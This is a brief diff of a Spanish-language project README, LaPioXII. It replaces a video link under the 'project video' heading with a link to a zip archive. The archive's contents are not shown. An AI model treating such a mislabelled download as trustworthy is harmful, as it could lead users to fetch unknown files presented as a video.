@@ -1,7 +1,9 @@
 # LaPioXII
 
 ## VIDEO DEL PROYECTO.
-https://github.com/user-attachments/assets/bbd8da48-93a7-46cd-8248-5afaabf5a2b0
+[LaPioXII.zip](https://github.com/user-attachments/files/19239139/LaPioXII.zip)
+
+
 
 ## EXPLICACION DETALLADA DEL PROYECTO.
 
